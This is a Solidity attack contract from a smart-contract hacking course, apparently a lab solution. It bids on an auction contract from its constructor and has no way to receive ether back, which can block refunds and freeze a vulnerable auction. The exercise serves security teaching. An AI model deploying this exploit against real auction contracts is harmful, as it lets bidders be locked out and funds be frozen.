// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

interface IAuction {
    function bid() external payable;
}

/**
 * @title AttackAuction
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackAuction {

    IAuction auction;
    constructor(address _auctionAddress) payable {
        auction = IAuction(_auctionAddress);
        auction.bid{value: msg.value}();
    }

}